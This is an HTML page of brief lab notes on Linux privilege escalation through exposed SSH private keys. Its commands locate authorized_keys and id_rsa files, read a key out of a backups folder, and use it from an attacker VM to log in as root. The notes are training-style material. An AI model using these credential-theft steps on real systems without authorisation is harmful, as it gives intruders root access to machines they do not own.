<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>SSH Keys</title>
</head><body><b>Escalation via SSH Keys<br/>
<br/>
Payload all the things<br/>
<br/>
SSH Key Sensitive files find / -name authorized_keys 2&gt; /dev/null<br/>
find / -name id_rsa 2&gt; /dev/null <br/>
<br/>
</b><img src="image.png"/><br/>
<br/>
<br/>
From here can cat out the key..<br/>
<br/>
<b>cat /backups/supersecretkeys/id_rsa<br/>
<br/>
</b>extract they key to attacker machine. then you may as well try login as root using it, wiht no other info, it doesnt hurt to try throw it around.<br/>
<br/>
Save it to a file id_rsa<br/>
<br/>
chmod 600 id_rsa<br/>
<br/>
<b>ssh -i id_rsa root@&lt;ip&gt;</b><br/>
<br/>
this will use the private key instead of a password to log in<br/>
<br/>
<img src="image 2.png"/><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
find / -name authorized_keys 2&gt; /dev/null<br/>
2. In a command prompt type:<br/>
find / -name id_rsa 2&gt; /dev/null<br/>
3. Note the results.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.<br/>
<br/>
Attacker VM<br/>
<br/>
1. In command prompt type: chmod 400 id_rsa<br/>
2. In command prompt type: ssh -i id_rsa root@&lt;ip&gt;<br/>
<br/>
You should now have a root shell :)<br/>
<br/>
<br/>
</body></html>